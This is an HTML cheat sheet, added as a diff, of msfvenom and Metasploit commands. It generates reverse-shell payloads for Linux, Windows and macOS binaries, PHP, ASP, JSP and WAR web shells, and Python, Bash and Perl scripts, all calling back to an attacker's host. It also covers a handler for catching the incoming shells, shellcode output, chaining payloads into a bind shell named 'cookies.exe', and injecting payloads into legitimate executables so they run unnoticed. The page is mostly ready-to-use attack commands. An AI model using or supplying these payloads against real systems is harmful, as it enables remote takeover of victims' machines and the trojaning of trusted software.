@@ -1,0 +1,92 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>MSFVenom</title>
+</head><body>List payloads<br/>
+msfvenom -l<br/>
+<br/>
+Binaries<br/>
+<br/>
+Linux<br/>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf<br/>
+<br/>
+Windows<br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe<br/>
+<br/>
+Mac<br/>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho<br/>
+<br/>
+<br/>
+Web Payloads<br/>
+<br/>
+PHP<br/>
+msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php<br/>
+cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br/>
+<br/>
+ASP<br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp<br/>
+<br/>
+JSP<br/>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp<br/>
+<br/>
+WAR<br/>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war<br/>
+<br/>
+<br/>
+Scripting Payloads<br/>
+<br/>
+Python<br/>
+msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py<br/>
+<br/>
+Bash<br/>
+msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh<br/>
+<br/>
+Perl<br/>
+msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl<br/>
+<br/>
+Shellcode<br/>
+For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.<br/>
+<br/>
+Linux Based Shellcode<br/>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;<br/>
+<br/>
+Windows Based Shellcode<br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;<br/>
+<br/>
+Mac Based Shellcode<br/>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;<br/>
+<br/>
+Handlers<br/>
+Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.<br/>
+<br/>
+use exploit/multi/handler<br/>
+set PAYLOAD &lt;Payload name&gt;<br/>
+set LHOST &lt;LHOST value&gt;<br/>
+set LPORT &lt;LPORT value&gt;<br/>
+set ExitOnSession false<br/>
+exploit -j -z<br/>
+<br/>
+Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘<br/>
+<br/>
+<br/>
+msfvenom -n, –nopsled<br/>
+Sometimes you need to add a few NOPs at the start of your payload. This will place a NOP sled of [length] size at the beginning of your payload.<br/>
+<br/>
+msfvenom –smallest<br/>
+If the “smallest” switch is used, msfvevom will attempt to create the smallest shellcode possible using the selected encoder and payload.<br/>
+<br/>
+msfvenom -c, –add-code<br/>
+Specify an additional win32 shellcode file to include, essentially creating a two (2) or more payloads in one (1) shellcode.<br/>
+&nbsp;root@kali:~# msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw &gt; messageBox<br/>
+&nbsp;root@kali:~# msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox TEXT="We are evil" -f raw &gt; messageBox2<br/>
+&nbsp;root@kali:~# msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe<br/>
+Running the “cookies.exe” file will execute both message box payloads, as well as the bind shell using default settings (port 4444).<br/>
+<br/>
+msfvenom -x, –template &amp; -k, –keep<br/>
+The -x, or –template, option is used to specify an existing executable to use as a template when creating your executable payload.<br/>
+Using the -k, or –keep, option in conjunction will preserve the template’s normal behaviour and have your injected payload run as a separate thread.<br/>
+<br/>
+msfvenom -f exe-only<br/>
+There is an interesting additional command line flag to “msfvenom” to change the format to “exe-only” rather than “exe”. &nbsp;This flag has the effect of either creating a new section header, or modifying the existing “.text” section in the case of 64-bit binaries. &nbsp;<br/>
+In the case of 32-bit binaries, the shellcode ends up in the “.text” section regardless, however, the characteristics flags differ and some extra assembly code are introduced in the “exe-only” version.</body></html>
